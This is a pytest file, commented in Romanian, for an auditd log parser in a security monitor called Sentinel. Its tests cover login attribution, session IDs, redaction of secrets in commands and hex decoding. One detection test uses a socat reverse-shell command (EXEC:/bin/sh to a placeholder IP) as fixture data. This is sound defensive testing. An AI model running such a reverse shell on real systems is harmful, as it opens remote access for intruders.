"""Sesiunile de login și istoricul de comenzi, așa cum le scrie nucleul.

Liniile de mai jos sunt copiate din `/var/log/audit/audit.log` de pe gazda de
producție și apoi sanitizate (alt cont, altă adresă): depozitul e public. Forma
lor — ordinea câmpurilor, ghilimelele, câmpurile îmbogățite de la sfârșit — e
cea reală, fiindcă exact acolo au fost cele două defecte găsite pe 24 august:

  * `_FIELD` cere chei numai din litere mici, deci `AUID="cineva"` era aruncat
    și `username` ieșea GOL la fiecare logare reușită. Alerta ar fi spus
    „cineva s-a logat" fără să poată spune cine;
  * `ses=432` nu era păstrat. E singurul lucru care leagă o comandă de logarea
    care a produs-o — fără el, un deploy și un om conectați în același timp sub
    același cont s-ar amesteca într-o singură cronologie.

Al treilea lucru probat aici e că `argv` ajunge REDACTAT în eveniment, nu la
citire: rândul intră într-o tabelă cu retenție nelimitată și pleacă spre o
găzduire partajată.
"""

from __future__ import annotations

import pytest

from sentinel.collectors.auditd import parse_auditd, parse_auditd_group
from sentinel.redact import MASK

# O logare reușită prin SSH. `acct=` LIPSEȘTE — contul e numai în câmpurile
# îmbogățite de la sfârșit, și de-asta lipsa lor se vedea ca username gol.
LOGIN_OK = (
    'type=USER_LOGIN msg=audit(1787575786.880:178043): pid=1814689 uid=0 '
    'auid=1000 ses=432 msg=\'op=login id=1000 '
    'exe="/usr/libexec/openssh/sshd-session" hostname=? addr=198.51.100.7 '
    'terminal=ssh res=success\'UID="root" AUID="operator" ID="operator"'
)

# Aceeași formă, dar de la o sesiune cu terminal — un om, nu un script.
LOGIN_INTERACTIV = LOGIN_OK.replace("terminal=ssh", "terminal=/dev/pts/0")

# O încercare eșuată din internet: contul nu există, deci auditd scrie
# `(unknown)`. Sunt 9200 pe 48 de ore pe gazda reală.
LOGIN_ESUAT = (
    'type=USER_LOGIN msg=audit(1787575000.100:1000): pid=99 uid=0 auid=4294967295 '
    'ses=4294967295 msg=\'op=login acct="(unknown)" '
    'exe="/usr/sbin/sshd" hostname=? addr=203.0.113.9 terminal=ssh '
    'res=failed\'UID="root" AUID="unset"'
)

LOGOUT = (
    'type=USER_LOGOUT msg=audit(1787575999.000:178500): pid=1814689 uid=0 '
    'auid=1000 ses=432 msg=\'op=PAM:session_close '
    'exe="/usr/libexec/openssh/sshd-session" hostname=? addr=198.51.100.7 '
    'terminal=ssh res=success\'UID="root" AUID="operator" ID="operator"'
)


def _comanda(argv: list[str], *, ses: str = "432", auid: str = "1000",
             tty: str = "pts0") -> list[str]:
    """Grupul de linii pe care îl produce un `execve` supravegheat."""
    args = " ".join(f'a{i}="{a}"' for i, a in enumerate(argv))
    return [
        f'type=SYSCALL msg=audit(1787575800.000:178100): arch=c000003e syscall=59 '
        f'success=yes exit=0 ppid=1814690 pid=1814800 auid={auid} uid=1000 '
        f'ses={ses} tty={tty} comm="{argv[0].rsplit("/", 1)[-1]}" '
        f'exe="{argv[0]}" key="sentinel_cmd"AUID="operator" UID="operator"',
        f'type=EXECVE msg=audit(1787575800.000:178100): argc={len(argv)} {args}',
        'type=PROCTITLE msg=audit(1787575800.000:178100): proctitle=2F62696E2F6C73',
    ]


# ---------------------------------------------------------------------------
# Logarea
# ---------------------------------------------------------------------------
def test_a_successful_login_says_WHO() -> None:
    """Defectul măsurat pe gazdă: `username` gol la fiecare logare reușită.

    O alertă de logare care nu poate numi contul nu e o alertă, e o notificare
    că s-a întâmplat ceva.
    """
    ev = parse_auditd(LOGIN_OK)
    assert ev is not None
    assert ev.action == "login"
    assert ev.username == "operator", (
        f"contul nu a fost citit din câmpurile îmbogățite: {ev.username!r}")
    assert ev.src_ip == "198.51.100.7"


def test_the_login_carries_the_session_id() -> None:
    """`ses` e cheia de legătură dintre logare și comenzile ei.

    Fără ea, două sesiuni simultane ale aceluiași cont se amestecă într-o
    singură cronologie, iar întrebarea «ce a rulat omul, față de ce a rulat
    deploy-ul» nu mai are răspuns.
    """
    ev = parse_auditd(LOGIN_OK)
    assert ev is not None
    assert ev.raw.get("ses") == "432", (
        f"identificatorul sesiunii nu a fost păstrat: {ev.raw!r}")


def test_an_interactive_session_is_distinguishable_from_a_script() -> None:
    """Discriminatorul pe care se sprijină întreaga politică de alertare.

    `terminal=ssh` e o comandă rulată prin ssh, fără terminal: deploy, rsync,
    diagnostic. `terminal=/dev/pts/N` e un om. Măsurat pe gazdă pe 7 zile: 557
    de sesiuni de primul fel, 29 de al doilea. Fără deosebirea asta, alerta ar
    fi de douăzeci de ori mai zgomotoasă decât e util.
    """
    automat = parse_auditd(LOGIN_OK)
    om = parse_auditd(LOGIN_INTERACTIV)
    assert automat is not None and om is not None
    assert automat.raw["terminal"] == "ssh"
    assert om.raw["terminal"].startswith("/dev/pts/")


def test_a_failed_login_does_not_invent_a_username() -> None:
    """`(unknown)` și `unset` sunt răspunsurile lui auditd la «n-am putut afla».

    Trecute mai departe ca nume, ar deveni conturi în panou, iar `(unknown)` ar
    ajunge primul în orice clasament de conturi — pe o gazdă unde sunt 9200 de
    astfel de linii la două zile.
    """
    ev = parse_auditd(LOGIN_ESUAT)
    assert ev is not None
    assert ev.username is None, f"s-a inventat un cont: {ev.username!r}"


def test_only_USER_LOGOUT_ends_a_session() -> None:
    """`USER_END` NU e perechea lui `USER_LOGIN`, iar asta a costat o livrare.

    E perechea lui `USER_START`: PAM deschide și închide un strat pentru fiecare
    `sudo`, `su` sau modul de autentificare din interiorul sesiunii, iar prima
    închidere sosea la o secundă după logare — încă din faza de autentificare a
    lui sshd.

    Numărat pe jurnalul real, într-o rotație: 31 `USER_LOGIN`, 44 `USER_START`,
    44 `USER_END`, 11 `USER_LOGOUT`. Cu `USER_END` drept ieșire, sesiunea era
    „închisă" înainte să ruleze prima comandă: **1534 de comenzi orfane din
    14157**, plus un rând-fantomă la fiecare închidere în plus.
    """
    strat = LOGOUT.replace("type=USER_LOGOUT", "type=USER_END")
    assert parse_auditd(strat) is None, (
        "un strat PAM închis a fost citit ca ieșire din sesiune")

    ev = parse_auditd(LOGOUT)
    assert ev is not None
    assert ev.action == "logout"
    assert ev.raw.get("ses") == "432"
    assert ev.username == "operator"


# ---------------------------------------------------------------------------
# Comenzile
# ---------------------------------------------------------------------------
def test_a_command_is_recorded_with_its_session_and_its_arguments() -> None:
    ev = parse_auditd_group(_comanda(["/usr/bin/systemctl", "restart", "nginx"]))
    assert ev is not None
    assert ev.action == "command"
    assert ev.raw["argv"] == "/usr/bin/systemctl restart nginx"
    assert ev.raw["ses"] == "432"
    assert ev.username == "operator", (
        "comanda nu poartă numele contului, doar numărul — iar un istoric în "
        "care scrie «1000» cere o a doua căutare la fiecare rând")


def test_a_secret_in_a_command_never_reaches_the_event() -> None:
    """Redactarea se face la COLECTARE, nu la citire.

    Rândul intră într-o tabelă cu retenție nelimitată și pleacă spre agregator.
    Redactat la citire, secretul ar rămâne în tabelă, în backup și în replică.
    """
    ev = parse_auditd_group(
        _comanda(["/usr/bin/mysql", "-u", "root", "-pParolaMea123", "sentinel"]))
    assert ev is not None
    assert "ParolaMea123" not in ev.raw["argv"], (
        f"parola a ajuns în eveniment: {ev.raw['argv']!r}")
    assert MASK in ev.raw["argv"]
    assert "/usr/bin/mysql" in ev.raw["argv"], "s-a redactat și partea utilă"


def test_a_long_command_is_kept_whole_for_the_history() -> None:
    """Pentru istoric, linia ÎNTREAGĂ e informația.

    Celelalte chei de audit taie `argv` la 400 de caractere, fiindcă acolo e o
    dovadă secundară. Aici e chiar răspunsul la «ce a rulat», iar o linie tăiată
    la 400 pierde exact coada în care stă fișierul atins.
    """
    lung = ["/usr/bin/tar", "czf", "/tmp/x.tgz", *[f"/var/www/fisier{i}" for i in range(60)]]
    ev = parse_auditd_group(_comanda(lung))
    assert ev is not None
    assert len(ev.raw["argv"]) > 400
    assert "fisier59" in ev.raw["argv"]


def test_a_command_without_a_login_session_is_not_recorded_as_one() -> None:
    """Garda filtrului din regulă, verificată în date, nu doar în fișier.

    `auid=unset` înseamnă un proces fără sesiune de login: un daemon, un cron, un
    proces dintr-un container. Regula din nucleu îl exclude, dar dacă vreodată nu
    o face — o regulă pierdută la o reîncărcare, o altă regulă cu aceeași cheie —
    evenimentul nu are voie să pretindă că e al cuiva.
    """
    ev = parse_auditd_group(_comanda(["/usr/bin/ls"], auid="4294967295"))
    assert ev is not None
    assert ev.username is None, (
        f"un proces fără sesiune de login a primit un cont: {ev.username!r}")


def test_the_parent_process_is_kept() -> None:
    """`ppid` e ce deosebește o comandă tastată de una pornită de un script.

    Panoul arată implicit ce a pornit din shell; fără părinte, cele câteva mii de
    rânduri ale unui deploy și cele zece ale unui om arată la fel.
    """
    ev = parse_auditd_group(_comanda(["/usr/bin/ls"]))
    assert ev is not None
    assert ev.raw.get("ppid") == "1814690"


@pytest.mark.parametrize("cheie,actiune", [
    ("sentinel_cmd", "command"),
    ("sentinel_exec", "suspicious_exec"),
])
def test_the_history_and_the_attacker_tool_rules_stay_separate(
        cheie: str, actiune: str) -> None:
    """Două întrebări diferite, două chei, două acțiuni.

    Cu o cheie comună, regula care alertează pe unelte de atacator ar primi
    fiecare comandă rulată pe gazdă și ar declara fiecare `ls` drept unealtă.
    """
    linii = _comanda(["/usr/bin/socat", "TCP:198.51.100.1:443", "EXEC:/bin/sh"])
    linii = [x.replace('key="sentinel_cmd"', f'key="{cheie}"') for x in linii]
    ev = parse_auditd_group(linii)
    assert ev is not None
    assert ev.action == actiune


def test_the_result_field_stops_at_the_closing_quote() -> None:
    """Defectul care a aruncat FIECARE logare prin sshd, pe 24 august 2026.

    auditd închide sublinia `msg='…'` fără spațiu înainte de câmpurile
    îmbogățite: `… res=success'UID="root" AUID="cineva"`. Cu o valoare care se
    oprește doar la spațiu, `res` ieșea `success'UID="root`.

    Nimic nu se plângea: câmpul exista, avea o valoare, și arăta rezonabil
    într-un dump. Dar verificarea `res == "success"` din proiecție îl respingea,
    deci nicio logare nu deschidea o sesiune — iar rândurile care totuși apăreau
    veneau din calea de rezervă a închiderii: fără cont, fără adresă, cu
    `opened_at == closed_at`. Pe ecran arăta ca «Sentinel n-a putut atribui
    logarea nimănui», adică plauzibil.
    """
    ev = parse_auditd(LOGIN_OK)
    assert ev is not None
    assert ev.raw["res"] == "success", (
        f"`res` a înghițit ce urmează după apostrof: {ev.raw['res']!r}")
    assert ev.raw["terminal"] == "ssh"


def test_the_enriched_fields_survive_the_quote_too() -> None:
    """Garda perechii: valoarea se oprește la apostrof, dar nu se pierde ce vine
    după el. `AUID` stă chiar acolo, iar fără el alerta n-ar putea numi contul."""
    ev = parse_auditd(LOGIN_OK)
    assert ev is not None
    assert ev.raw["enriched"]["AUID"] == "operator"
    assert ev.username == "operator"


def test_the_account_is_resolved_even_without_the_enriched_fields() -> None:
    """`log_format = ENRICHED` nu pune numele pe FIECARE înregistrare.

    Măsurat pe gazdă: 4530 de linii cu `AUID=` în jurnalul curent — și totuși
    logări reușite care se terminau la `res=success'`, fără nimic după. Cu numele
    citit numai de acolo, alerta spunea «Cont: cont necunoscut» pentru chiar
    sesiunea operatorului.
    """
    fara = LOGIN_OK.split("res=success'")[0] + "res=success'"
    ev = parse_auditd(fara)
    assert ev is not None
    assert ev.raw["res"] == "success"
    assert ev.raw["ses"] == "432"
    # Numele vine acum din rezolvarea numerică a lui `auid`, dacă gazda o poate
    # face. Pe mașina de dezvoltare nu există `pwd`, deci se cere doar ca NUMĂRUL
    # să rămână — el e ce nu se pierde niciodată.
    assert ev.raw["auid"] == "1000"


def test_an_unresolvable_account_stays_NULL_rather_than_becoming_a_number() -> None:
    """«Nu știu cine» se scrie NULL, nu `1000`.

    Un istoric în care scrie «1000» cere o a doua căutare la fiecare rând, iar
    unul în care scrie `(unknown)` inventează un cont care ajunge primul în
    clasamente.
    """
    from sentinel.collectors.auditd import _resolve_uid

    assert _resolve_uid(None) is None
    assert _resolve_uid("nu-e-numar") is None
    assert _resolve_uid("4294967295") is None


def test_a_hex_encoded_argument_is_decoded_not_stored_as_hex() -> None:
    """auditd scrie HEXAZECIMAL orice argument cu spații sau ghilimele.

    Măsurat pe gazdă pe 25 august 2026: `bash -c "…"` sosea ca două sute de
    caractere hexa. Două consecințe, amândouă rele:

      * ilizibil pentru operator — iar un shell cu o linie întreagă în el e
        tocmai comanda cea mai interesantă din tot istoricul;
      * suficient de „amestecat" cât să fie luat de redactare drept token și
        înlocuit cu masca. Deci singura comandă pe care chiar vrei s-o citești
        era singura care nu se putea citi.
    """
    linie_hex = (
        'type=EXECVE msg=audit(1787575800.000:178100): argc=3 a0="bash" a1="-c" '
        'a2=73797374656D63746C20726573746172742073656E74696E656C2D776562')
    linii = _comanda(["/usr/bin/bash"])
    linii[1] = linie_hex
    ev = parse_auditd_group(linii)
    assert ev is not None
    assert ev.raw["argv"] == "bash -c systemctl restart sentinel-web", (
        f"argumentul hexa n-a fost decodificat: {ev.raw['argv']!r}")


def test_a_normal_argument_is_not_mangled_by_the_decoder() -> None:
    """Garda celuilalt sens: `deadbeef` e un nume legitim de fișier.

    Decodorul se aplică numai șirurilor care sunt PERECHI hexa pe toată
    lungimea, iar un argument obișnuit trece neatins. Fără garda asta, testul de
    mai sus ar trece și pentru un decodor care strică orice.
    """
    ev = parse_auditd_group(_comanda(["/usr/bin/cat", "/tmp/deadbeef", "-n"]))
    assert ev is not None
    assert ev.raw["argv"] == "/usr/bin/cat /tmp/deadbeef -n"


def test_a_hex_argument_carrying_NUL_separators_does_not_poison_the_batch() -> None:
    """A treia oprire a ingestiei, pe 25 august 2026.

    `argv` e NUL-separat în nucleu, iar auditd codifică octeții BRUȚI — deci un
    argument hexa poate purta separatorii în el. PostgreSQL refuză `\u0000` în
    `text` și în `jsonb`, iar `executemany` respinge LOTUL ÎNTREG: un octet
    dintr-o linie de jurnal a oprit colectarea pentru toate cele cinci surse.

    NUL-ul se înlocuiește cu SPAȚIU, nu se șterge: asta și e — granița dintre
    două argumente. Șters, `systemctl` și `restart` s-ar lipi într-un cuvânt care
    nu s-a rulat niciodată.
    """
    brut = b"systemctl\x00restart\x00sentinel-web".hex().upper()
    linii = _comanda(["/usr/bin/bash"])
    linii[1] = (f'type=EXECVE msg=audit(1787575800.000:178100): argc=2 '
                f'a0="bash" a1={brut}')
    ev = parse_auditd_group(linii)
    assert ev is not None
    assert "\x00" not in ev.raw["argv"], "un NUL a ajuns în eveniment"
    assert ev.raw["argv"] == "bash systemctl restart sentinel-web"
